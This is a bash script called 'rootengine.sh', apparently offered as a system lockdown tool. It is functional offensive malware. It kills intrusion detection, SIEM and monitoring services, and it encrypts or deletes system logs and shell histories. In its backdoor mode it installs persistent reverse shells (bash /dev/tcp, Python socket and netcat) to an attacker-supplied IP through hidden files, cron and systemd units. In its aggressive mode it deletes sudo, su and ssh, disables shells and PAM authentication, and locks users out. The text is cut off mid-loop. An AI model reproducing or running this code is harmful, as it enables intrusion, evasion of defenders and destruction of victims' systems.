#!/bin/bash
# rootengine.sh - Enhanced system lockdown with security tool neutralization
# Compatible with: Ubuntu, Debian, Fedora, Linux Mint, Arch Linux, Manjaro, openSUSE, Pop!_OS, Kali Linux, AlmaLinux and other Debian based OS
# Developer: @rafok2v9c
# Version: 1.0

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

show_help() {
    echo -e "${RED}"
    cat << "EOF"
██████╗  ██████╗  ██████╗ ████████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗ 
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝ v1.0 
EOF
    echo -e "${NC}"
    echo -e "${CYAN}Author: @rafok2v9c${NC}"
    echo ""
    cat << 'HELP_EOF'
ROOTENGINE - System Lockdown Tool

USAGE:
    sudo ./rootengine.sh

OPTIONS:
    --help, -h          Show this help message
    (no option)         Interactive menu mode

MODES:
    1. Aggressive       - Maximum lockdown
    2. Backdoor         - Lockdown + reverse shell access

FEATURES:
    - Disables IDS/IPS 
    - Blocks SIEM 
    - Stops monitoring 
    - Encrypts/deletes all logs
    - Blocks admin access (SSH, FTP, console)
    - Preserves web services (HTTP/HTTPS)
    - Multiple backdoor persistence methods

WARNING:
    Irreversible modifications! Test environments only.
    Always take system snapshots before running.

HELP_EOF
}

if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
    show_help
    exit 0
fi

echo -e "${RED}"
cat << "EOF"
██████╗  ██████╗  ██████╗ ████████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝ v1.0 
EOF
echo -e "${NC}"

if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}ERROR: This script must be run as root${NC}"
    echo -e "${YELLOW}Usage: sudo $0${NC}"
    exit 1
fi


BACKDOOR_MODE=0
BACKDOOR_IP=""
BACKDOOR_PORT=""
HIDDEN_DIRS=(
    "/.cache/.system"
    "/var/tmp/.x11"
    "/dev/shm/.config"
)
INIT_SYSTEM=""

show_menu() {
    clear
    echo -e "${RED}"
    cat << "EOF"
██████╗  ██████╗  ██████╗ ████████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝ v1.0 
EOF
    echo -e "${NC}"
    echo -e "${GREEN}Select execution mode:${NC}"
    echo ""
    echo -e "${YELLOW}1)${NC} Aggressive Mode - Maximum Lockdown"
    echo -e "${YELLOW}2)${NC} Backdoor Mode - Attacker Access Preserved"
    echo ""
    echo -n -e "${GREEN}Enter your choice (1 or 2): ${NC}"
    read -r choice
    
    case $choice in
        1)
            BACKDOOR_MODE=0
            echo -e "${GREEN}Mode selected: Aggressive (Maximum Lockdown)${NC}"
            sleep 1
            ;;
        2)
            BACKDOOR_MODE=1
            echo -e "${GREEN}Mode selected: Backdoor Mode${NC}"
            sleep 1
            echo ""
            echo -n -e "${GREEN}Enter attacker IP address: ${NC}"
            read -r BACKDOOR_IP
            echo -n -e "${GREEN}Enter attacker port: ${NC}"
            read -r BACKDOOR_PORT
            echo -e "${GREEN}Backdoor configured: $BACKDOOR_IP:$BACKDOOR_PORT${NC}"
            sleep 1
            ;;
        *)
            echo -e "${RED}Invalid choice!${NC}"
            sleep 1
            show_menu
            ;;
    esac
}

show_progress() {
    local pid=$1
    local message=$2
    local spin='-\|/'
    local i=0
    echo -n -e "${YELLOW}$message ${NC}"
    while kill -0 "$pid" 2>/dev/null; do
        i=$(( (i+1) %4 ))
        printf "${BLUE}%s${NC}" "${spin:$i:1}"
        printf "\b"
        sleep 0.1
    done
    wait "$pid" 2>/dev/null
    printf "\r%-80s\r" " "
    echo -e "${GREEN}$message [DONE]${NC}"
}

command_exists() {
    command -v "$1" >/dev/null 2>&1
}

detect_init_system() {
    if [ -n "$INIT_SYSTEM" ]; then
        echo "$INIT_SYSTEM"
        return
    fi
    
    if [ -d /run/systemd/system ] || [ -d /etc/systemd ]; then
        INIT_SYSTEM="systemd"
    elif command_exists initctl; then
        INIT_SYSTEM="upstart"
    else
        INIT_SYSTEM="sysvinit"
    fi
    echo "$INIT_SYSTEM"
}

service_command() {
    local action=$1
    local service=$2
    local init_system=$(detect_init_system)
    
    case $init_system in
        "systemd")
            if [ -f "/etc/systemd/system/${service}.service" ] || [ -f "/usr/lib/systemd/system/${service}.service" ] || [ -f "/lib/systemd/system/${service}.service" ]; then
                systemctl "$action" "$service" 2>/dev/null
            fi
            ;;
        "upstart")
            if [ -f "/etc/init/${service}.conf" ]; then
                initctl "$action" "$service" 2>/dev/null
            fi
            ;;
        "sysvinit")
            if [ -f "/etc/init.d/${service}" ]; then
                /etc/init.d/"$service" "$action" 2>/dev/null
            fi
            ;;
    esac
}



neutralize_ids_ips() {
    echo -e "${GREEN}Neutralizing IDS/IPS systems...${NC}"
    
    for service in snort snortd; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "snort" 2>/dev/null
    
    for service in suricata; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "suricata" 2>/dev/null
    
    for service in zeek bro; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "zeek\|bro" 2>/dev/null
    
    for service in fail2ban; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "fail2ban" 2>/dev/null
    
    for service in tripwire; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "tripwire" 2>/dev/null
    
    for service in aide; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "aide" 2>/dev/null
    
    for service in samhain; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "samhain" 2>/dev/null
    
    echo -e "${GREEN}IDS/IPS neutralization complete [DONE]${NC}"
}

neutralize_siem_soar() {
    echo -e "${GREEN}Neutralizing SIEM/SOAR platforms...${NC}"
    
    for service in splunk splunkd; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "splunk" 2>/dev/null
    
    for service in elasticsearch logstash kibana filebeat metricbeat auditbeat; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "elastic\|logstash\|kibana\|beat" 2>/dev/null
    
    for service in qradar; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "qradar" 2>/dev/null
    
    for service in arcsight; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "arcsight" 2>/dev/null
    
    for service in logrhythm; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "logrhythm" 2>/dev/null
    
    for service in thehive cortex; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "thehive\|cortex" 2>/dev/null
    
    for service in graylog; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "graylog" 2>/dev/null
    
    for service in securityonion; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "securityonion" 2>/dev/null
    
    for service in ossim; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "ossim\|alienvault" 2>/dev/null
    
    echo -e "${GREEN}SIEM/SOAR neutralization complete [DONE]${NC}"
}

neutralize_monitoring() {
    echo -e "${GREEN}Neutralizing monitoring tools...${NC}"
    
    for service in nagios nrpe; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "nagios\|nrpe" 2>/dev/null
    
    for service in zabbix-agent zabbix-server; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "zabbix" 2>/dev/null
    
    for service in prometheus node_exporter; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "prometheus\|node_exporter" 2>/dev/null
    
    for service in grafana grafana-server; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "grafana" 2>/dev/null
    
    for service in datadog-agent; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "datadog" 2>/dev/null
    
    for service in newrelic-infra; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "newrelic" 2>/dev/null
    
    echo -e "${GREEN}Monitoring neutralization complete [DONE]${NC}"
}

manage_logs() {
    echo -e "${GREEN}Managing system logs...${NC}"
    
    for service in rsyslog syslog-ng syslog systemd-journald auditd; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "rsyslog\|syslog\|journald\|auditd" 2>/dev/null
    
    if command_exists openssl; then
        echo -e "${YELLOW}Encrypting logs with openssl...${NC}"
        RANDOM_KEY=$(head -c 32 /dev/urandom 2>/dev/null | base64 | head -c 32)
        if [ -z "$RANDOM_KEY" ]; then
            RANDOM_KEY=$(echo "$(date +%s)$RANDOM$$" | sha256sum | base64 | head -c 32)
        fi
        
        for logdir in /var/log /var/log/audit /var/log/messages /var/log/secure /var/log/auth.log; do
            if [ -d "$logdir" ]; then
                for logfile in $(find "$logdir" -type f 2>/dev/null); do
                    if [ -f "$logfile" ] && [ -w "$logfile" ]; then
                        if openssl enc -aes-256-cbc -salt -in "$logfile" -out "${logfile}.enc" -k "$RANDOM_KEY" 2>/dev/null; then
                            rm -f "$logfile" 2>/dev/null
                        else
                            rm -f "$logfile" 2>/dev/null
                        fi
                    fi
                done
            elif [ -f "$logdir" ] && [ -w "$logdir" ]; then
                if openssl enc -aes-256-cbc -salt -in "$logdir" -out "${logdir}.enc" -k "$RANDOM_KEY" 2>/dev/null; then
                    rm -f "$logdir" 2>/dev/null
                else
                    rm -f "$logdir" 2>/dev/null
                fi
            fi
        done
    else
        echo -e "${YELLOW}OpenSSL not available, deleting logs directly...${NC}"
        for logdir in /var/log /var/log/audit; do
            if [ -d "$logdir" ]; then
                rm -rf "$logdir"/* 2>/dev/null
            fi
        done
    fi
    
    if command_exists journalctl; then
        journalctl --vacuum-time=1s 2>/dev/null
        journalctl --rotate 2>/dev/null
        journalctl --vacuum-time=1s 2>/dev/null
    fi
    
    if [ -f /var/log/audit/audit.log ]; then
        cat /dev/null > /var/log/audit/audit.log 2>/dev/null
    fi
    
    for file in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
        if [ -f "$file" ]; then
            cat /dev/null > "$file" 2>/dev/null
        fi
    done
    
    for histfile in /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history; do
        if [ -f "$histfile" ]; then
            cat /dev/null > "$histfile" 2>/dev/null
        fi
    done
    
    unset HISTFILE
    unset HISTSIZE
    export HISTSIZE=0
    
    echo -e "${GREEN}Log management complete [DONE]${NC}"
}

setup_enhanced_backdoor() {
    if [ $BACKDOOR_MODE -eq 0 ]; then
        return
    fi
    
    echo -e "${GREEN}Setting up enhanced backdoor persistence...${NC}"
    
    
    cat > /tmp/.system_update << EOF
#!/bin/bash
while true; do
    # Try Bash TCP (detached)
    if command -v bash >/dev/null 2>&1; then
        bash -c "bash -i >& /dev/tcp/$BACKDOOR_IP/$BACKDOOR_PORT 0>&1" 2>/dev/null
    fi
    
    # Try Python
    if command -v python >/dev/null 2>&1; then
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$BACKDOOR_IP",$BACKDOOR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 2>/dev/null
    elif command -v python3 >/dev/null 2>&1; then
        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$BACKDOOR_IP",$BACKDOOR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 2>/dev/null
    fi
    
    # Try Netcat
    if command -v nc >/dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $BACKDOOR_IP $BACKDOOR_PORT >/tmp/f
    fi
    
    sleep 10
done
EOF
    
    chmod +x /tmp/.system_update
    
 
    cp /tmp/.system_update /dev/shm/.system_update 2>/dev/null
    cp /tmp/.system_update /var/tmp/.system_update 2>/dev/null
    chmod +x /dev/shm/.system_update 2>/dev/null
    chmod +x /var/tmp/.system_update 2>/dev/null
    
    
    if command -v setsid >/dev/null 2>&1; then
        setsid /tmp/.system_update >/dev/null 2>&1 &
    else
        nohup /tmp/.system_update >/dev/null 2>&1 &
    fi

    for dir in "${HIDDEN_DIRS[@]}"; do
        mkdir -p "$dir" 2>/dev/null
        chmod 700 "$dir" 2>/dev/null
        
        cp /tmp/.system_update "$dir/update.sh" 2>/dev/null
        chmod +x "$dir/update.sh" 2>/dev/null
        
        
        if command -v setsid >/dev/null 2>&1; then
            setsid "$dir/update.sh" >/dev/null 2>&1 &
        else
            nohup "$dir/update.sh" >/dev/null 2>&1 &
        fi
        
        if ! crontab -l 2>/dev/null | grep -q "$dir/update.sh"; then
            (crontab -l 2>/dev/null; echo "* * * * * $dir/update.sh >/dev/null 2>&1") | crontab - 2>/dev/null
            (crontab -l 2>/dev/null; echo "@reboot $dir/update.sh >/dev/null 2>&1") | crontab - 2>/dev/null
        fi
        
        if [ -d /etc/systemd/system ]; then
            service_name="system-$(echo $dir | tr '/' '-' | sed 's/^-//')"
            cat > "/etc/systemd/system/${service_name}.service" << SERVICE_EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=$dir/update.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
SERVICE_EOF
            systemctl daemon-reload >/dev/null 2>&1
            systemctl enable "${service_name}.service" >/dev/null 2>&1
            systemctl start "${service_name}.service" >/dev/null 2>&1
        fi
    done
    
    echo -e "${GREEN}Backdoor persistence established [DONE]${NC}"
}

apply_kernel_restrictions() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping kernel restrictions (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Applying kernel-level restrictions...${NC}"
    
    if [ -f /proc/sys/kernel/sysrq ]; then
        echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
    fi
    
    
    if [ -f /proc/sys/kernel/pty/max ]; then
        echo 64 > /proc/sys/kernel/pty/max 2>/dev/null
    fi
    
    if [ -f /proc/sys/kernel/core_pattern ]; then
        echo "|/bin/false" > /proc/sys/kernel/core_pattern 2>/dev/null
    fi
    
   
    if [ -f /proc/sys/kernel/dmesg_restrict ]; then
        echo 1 > /proc/sys/kernel/dmesg_restrict 2>/dev/null
    fi
    
    if [ -f /proc/sys/kernel/kptr_restrict ]; then
        echo 2 > /proc/sys/kernel/kptr_restrict 2>/dev/null
    fi
    
    if [ -f /proc/sys/net/core/bpf_jit_harden ]; then
        echo 2 > /proc/sys/net/core/bpf_jit_harden 2>/dev/null
    fi
    
    if [ -f /proc/sys/fs/suid_dumpable ]; then
        echo 0 > /proc/sys/fs/suid_dumpable 2>/dev/null
    fi
    
    echo -e "${GREEN}Kernel restrictions applied [DONE]${NC}"
}

apply_resource_restrictions() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping resource restrictions (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Applying resource restrictions...${NC}"
    
    if [ -d /sys/fs/cgroup ]; then
        if [ -d /sys/fs/cgroup/cpu ]; then
            mkdir -p /sys/fs/cgroup/cpu/restricted 2>/dev/null
            echo 10000 > /sys/fs/cgroup/cpu/restricted/cpu.cfs_quota_us 2>/dev/null
        fi
        
        if [ -d /sys/fs/cgroup/memory ]; then
            mkdir -p /sys/fs/cgroup/memory/restricted 2>/dev/null
            echo 52428800 > /sys/fs/cgroup/memory/restricted/memory.limit_in_bytes 2>/dev/null
        fi
    fi
    
    echo -e "${GREEN}Resource restrictions applied [DONE]${NC}"
}

isolate_users() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping user isolation (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Isolating user accounts...${NC}"
    
    for user in $(awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd 2>/dev/null); do
        if [ "$user" != "www-data" ] && [ "$user" != "nginx" ] && [ "$user" != "apache" ] && [ "$user" != "httpd" ] && [ "$user" != "lighttpd" ] && [ "$user" != "php-fpm" ]; then
            usermod -L "$user" 2>/dev/null
            usermod -s /sbin/nologin "$user" 2>/dev/null
        fi
    done
    
    usermod -s /bin/false root 2>/dev/null
    
    echo -e "${GREEN}User accounts isolated (web users protected) [DONE]${NC}"
}

destroy_terminals() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping TTY destruction (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Destroying terminal devices...${NC}"
    
    for tty in /dev/tty*; do
        if [ -c "$tty" ]; then
            chmod 000 "$tty" 2>/dev/null
        fi
    done
    
    chmod 000 /dev/ptmx 2>/dev/null
    
    chmod 000 /dev/console 2>/dev/null
    
    umount /dev/pts 2>/dev/null
    
    echo -e "${GREEN}Terminal devices destroyed [DONE]${NC}"
}

sabotage_system_binaries() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping binary sabotage (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Sabotaging system binaries (protecting web servers)...${NC}"
    
    
    for cmd in sudo su; do
        for path in /usr/bin/$cmd /bin/$cmd /usr/sbin/$cmd /sbin/$cmd; do
            rm -f "$path" 2>/dev/null
        done
    done
    
    for cmd in nc netcat telnet ssh scp sftp; do
        for path in /usr/bin/$cmd /bin/$cmd /usr/sbin/$cmd /sbin/$cmd; do
            rm -f "$path" 2>/dev/null
        done
    done
    
    for cmd in init telinit; do
        for path in /usr/bin/$cmd /bin/$cmd /usr/sbin/$cmd /sbin/$cmd; do
            rm -f "$path" 2>/dev/null
        done
    done
    
    cat > /tmp/.sabotage_shells.sh << 'SHELL_SABOTAGE'
#!/bin/sh
sleep 10
for shell in bash sh dash zsh; do
    for path in /bin/$shell /usr/bin/$shell; do
        if [ -f "$path" ] && [ -x "$path" ]; then
            mv "$path" "${path}.disabled" 2>/dev/null
            echo '#!/bin/false' > "$path" 2>/dev/null
            chmod 000 "$path" 2>/dev/null
        fi
    done
done
rm -f /tmp/.sabotage_shells.sh
SHELL_SABOTAGE
    chmod +x /tmp/.sabotage_shells.sh
    nohup /tmp/.sabotage_shells.sh >/dev/null 2>&1 &
    
    echo -e "${GREEN}Waiting for main script to complete before shell sabotage...${NC}"
    sleep 12
    
    echo -e "${GREEN}System binaries sabotaged (web servers protected) [DONE]${NC}"
}

destroy_pam() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping PAM destruction (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Destroying PAM authentication...${NC}"
    
    if [ -d /etc/pam.d ]; then
        for pam_file in /etc/pam.d/*; do
            if [ -f "$pam_file" ] && [ -w "$pam_file" ]; then
                cat > "$pam_file" << 'PAM_DENY'
auth required pam_deny.so
account required pam_deny.so
password required pam_deny.so
session required pam_deny.so
PAM_DENY
            fi
        done
    fi
    
    if [ -f /etc/nsswitch.conf ] && [ -w /etc/nsswitch.conf ]; then
        echo "passwd: files" > /etc/nsswitch.conf
        echo "shadow: files" >> /etc/nsswitch.conf
        echo "group: files" >> /etc/nsswitch.conf
    fi
    
    if [ -f /etc/security/access.conf ] && [ -w /etc/security/access.conf ]; then
        echo "- : ALL : ALL" > /etc/security/access.conf
    fi
    
    echo -e "${GREEN}PAM authentication destroyed [DONE]${NC}"
}

restrict_filesystem() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping filesystem restrictions (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Applying filesystem restrictions (protecting web roots)...${NC}"
    
    mount -o remount,size=10M,nosuid,nodev /tmp 2>/dev/null
    
    
    rm -rf /root/.bash* 2>/dev/null
    rm -rf /root/.ssh 2>/dev/null
    
    mkdir -p /tmp/.inode_fill 2>/dev/null
    for i in $(seq 1 1000); do
        touch "/tmp/.inode_fill/$i" 2>/dev/null || break
    done
    
    
    echo -e "${GREEN}Filesystem restrictions applied (web roots safe) [DONE]${NC}"
}

protect_web_services() {
    echo -e "${GREEN}Setting up MAXIMUM web service protection...${NC}"
    
    for service in apache2 httpd nginx lighttpd php-fpm node npm pm2 gunicorn uwsgi python python3 flask django puma unicorn passenger rails tomcat tomcat8 tomcat9 jetty wildfly jboss dotnet kestrel varnish haproxy caddy traefik envoy; do
        if pgrep "$service" > /dev/null 2>&1; then
            for pid in $(pgrep "$service" 2>/dev/null); do
                renice -20 -p "$pid" 2>/dev/null
                if command_exists ionice; then
                    ionice -c1 -n0 -p "$pid" 2>/dev/null
                fi
                if command_exists chrt; then
                    chrt -f -p 99 "$pid" 2>/dev/null
                fi
                if [ -f "/proc/$pid/oom_score_adj" ]; then
                    echo -1000 > "/proc/$pid/oom_score_adj" 2>/dev/null
                fi
                if [ -f "/proc/$pid/freeze" ]; then
                    echo 0 > "/proc/$pid/freeze" 2>/dev/null
                fi
            done
            echo -e "${GREEN}Protected: $service (PID: $(pgrep "$service" | head -1))${NC}"
        fi
    done
    
    cat > /tmp/web_watchdog.sh << 'WATCHDOG_SCRIPT'
#!/bin/sh
while true; do
    for service in apache2 httpd nginx lighttpd php-fpm node pm2 gunicorn uwsgi puma unicorn tomcat tomcat8 tomcat9 jetty varnish haproxy caddy; do
        if ! pgrep "$service" >/dev/null 2>&1; then
            systemctl start "$service" 2>/dev/null || \
            service "$service" start 2>/dev/null || \
            /etc/init.d/"$service" start 2>/dev/null
            
            sleep 2
            for pid in $(pgrep "$service" 2>/dev/null); do
                renice -20 -p "$pid" 2>/dev/null
                if command -v ionice >/dev/null 2>&1; then
                    ionice -c1 -n0 -p "$pid" 2>/dev/null
                fi
                if command -v chrt >/dev/null 2>&1; then
                    chrt -f -p 99 "$pid" 2>/dev/null
                fi
                if [ -f "/proc/$pid/oom_score_adj" ]; then
                    echo -1000 > "/proc/$pid/oom_score_adj" 2>/dev/null
                fi
            done
        fi
    done
    
    if [ -f /proc/net/tcp ]; then
        if ! grep -q "0050\\|01BB\\|0BB8\\|1F90" /proc/net/tcp 2>/dev/null; then
            for service in apache2 httpd nginx lighttpd node pm2 gunicorn uwsgi puma tomcat; do
                systemctl restart "$service" 2>/dev/null
            done
        fi
    fi
    
    sleep 5  # Check every 5 seconds (aggressive)
done
WATCHDOG_SCRIPT
    
    chmod +x /tmp/web_watchdog.sh
    nohup /tmp/web_watchdog.sh >/dev/null 2>&1 &
    
    if [ -d /etc/systemd/system ]; then
        cat > /etc/systemd/system/web-watchdog.service << 'WATCHDOG_SERVICE'
[Unit]
Description=Web Service Watchdog
After=network.target

[Service]
Type=simple
ExecStart=/tmp/web_watchdog.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
WATCHDOG_SERVICE
        
        systemctl daemon-reload 2>/dev/null
        systemctl enable web-watchdog.service 2>/dev/null
        systemctl start web-watchdog.service 2>/dev/null
    fi
    
    echo -e "${GREEN}Web service protection enabled [DONE]${NC}"
}

setup_firewall() {
    echo -e "${YELLOW}Configuring firewall...${NC}"
    
    if [ -x /sbin/iptables ] || [ -x /usr/sbin/iptables ]; then
        IPTABLES_CMD=$(command -v iptables)
        
        $IPTABLES_CMD -F 2>/dev/null
        $IPTABLES_CMD -X 2>/dev/null
        $IPTABLES_CMD -P INPUT DROP 2>/dev/null
        $IPTABLES_CMD -P FORWARD DROP 2>/dev/null
        $IPTABLES_CMD -P OUTPUT ACCEPT 2>/dev/null
        
        
        $IPTABLES_CMD -A INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null
        
        
        $IPTABLES_CMD -A INPUT -p tcp --dport 8080 -j ACCEPT 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 3000 -j ACCEPT 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 5000 -j ACCEPT 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 8000 -j ACCEPT 2>/dev/null
        
        if [ $BACKDOOR_MODE -eq 1 ] && [ -n "$BACKDOOR_PORT" ]; then
            $IPTABLES_CMD -A INPUT -p tcp --dport "$BACKDOOR_PORT" -j ACCEPT 2>/dev/null
            $IPTABLES_CMD -A OUTPUT -p tcp --dport "$BACKDOOR_PORT" -j ACCEPT 2>/dev/null
        fi
        
        $IPTABLES_CMD -A INPUT -p tcp --dport 22 -j DROP 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 21 -j DROP 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 23 -j DROP 2>/dev/null
        
        $IPTABLES_CMD -A INPUT -i lo -j ACCEPT 2>/dev/null
        $IPTABLES_CMD -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null
        
        echo -e "${GREEN}iptables configured [DONE]${NC}"
    elif [ -x /usr/sbin/ufw ] || [ -x /usr/bin/ufw ]; then
        UFW_CMD=$(command -v ufw)
        $UFW_CMD --force reset >/dev/null 2>&1
        $UFW_CMD default deny incoming >/dev/null 2>&1
        
        $UFW_CMD allow 80/tcp >/dev/null 2>&1
        $UFW_CMD allow 443/tcp >/dev/null 2>&1
        $UFW_CMD allow 8080/tcp >/dev/null 2>&1
        $UFW_CMD allow 8443/tcp >/dev/null 2>&1
        $UFW_CMD allow 3000/tcp >/dev/null 2>&1
        $UFW_CMD allow 5000/tcp >/dev/null 2>&1
        $UFW_CMD allow 8000/tcp >/dev/null 2>&1
        
        if [ $BACKDOOR_MODE -eq 1 ] && [ -n "$BACKDOOR_PORT" ]; then
            $UFW_CMD allow "$BACKDOOR_PORT"/tcp >/dev/null 2>&1
        fi
        
        $UFW_CMD --force enable >/dev/null 2>&1
        echo -e "${GREEN}ufw configured [DONE]${NC}"
    fi
}

show_menu
setup_enhanced_backdoor

echo -e "${GREEN}Starting system lockdown...${NC}"
echo ""

neutralize_ids_ips
neutralize_siem_soar
neutralize_monitoring

manage_logs

echo -e "${GREEN}Setting up CRITICAL boot persistence for web services...${NC}"

for service in apache2 httpd nginx lighttpd php-fpm node pm2 gunicorn uwsgi puma tomcat tomcat8 tomcat9; do
    if command_exists $service || [ -f "/etc/init.d/$service" ] || [ -f "/lib/systemd/system/${service}.service" ] || [ -f "/usr/lib/systemd/system/${service}.service" ]; then
        
        service_command enable $service 2>/dev/null
        service_command start $service 2>/dev/null
        
        if [ -d /etc/systemd/system ]; then
            systemctl enable $service 2>/dev/null
            systemctl start $service 2>/dev/null
        fi
        
        if [ -d /etc/rc2.d ] && [ -f "/etc/init.d/$service" ]; then
            ln -sf /etc/init.d/$service /etc/rc2.d/S99$service 2>/dev/null
            ln -sf /etc/init.d/$service /etc/rc3.d/S99$service 2>/dev/null
            ln -sf /etc/init.d/$service /etc/rc4.d/S99$service 2>/dev/null
